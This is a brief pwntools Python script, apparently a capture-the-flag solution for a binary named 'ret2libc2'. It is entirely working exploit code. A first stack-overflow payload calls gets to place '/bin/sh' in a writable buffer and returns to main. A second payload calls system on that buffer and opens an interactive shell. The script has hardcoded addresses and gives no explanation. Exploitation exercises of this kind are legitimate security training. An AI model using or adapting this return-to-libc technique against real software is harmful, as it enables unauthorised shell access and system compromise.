from pwn import *
sh = process('./ret2libc2')
#gdb.attach(sh)
gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
main_address=0x08048648
payload1='a'*(0x64+0x4+0x8)+p32(gets_plt)+p32(main_address)+p32(buf2)
sh.sendline(payload1)
sh.sendline('/bin/sh')
payload2='a'*(0x64+0x4)+p32(system_plt)+'aaaa'+p32(buf2)
sh.sendline(payload2)
sh.interactive()
